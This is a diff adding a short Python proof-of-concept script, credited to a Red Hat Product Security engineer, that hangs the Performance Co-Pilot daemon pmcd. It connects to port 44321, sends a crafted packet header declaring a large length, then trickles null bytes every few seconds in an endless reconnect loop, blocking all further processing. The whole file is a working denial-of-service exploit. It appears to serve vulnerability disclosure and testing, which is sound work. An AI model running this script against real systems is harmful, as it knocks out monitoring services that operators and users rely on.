@@ -1,0 +1,26 @@
+#
+# usage: python hang-pmcd HOST
+#
+# Connects to pmcd on HOST and blocks all further processing.
+#
+# Florian Weimer / Red Hat Product Security Team
+#
+import socket
+import sys
+import time
+_, host = sys.argv
+while True:
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((host, 44321))
+        sock.send(str("\x00\x00\x00\x14\x00\x00p\x0c\x00\x00\x00\x01\x00\x00\x00\x01\x01\x02\x00\x00").encode())
+        pkt = str('\x00\x00\xff\xff\x00\x00p\x03\x00\x00\x00\x01').encode()
+        sock.send(pkt)
+        for x in range(0xFFFF - len(pkt)):
+            time.sleep(3)
+            sock.send(str("\x00").encode())
+        sock.close()
+    except socket.error as e:
+        print("hang-pmcd: socket error:", e)
+        time.sleep(1)
+
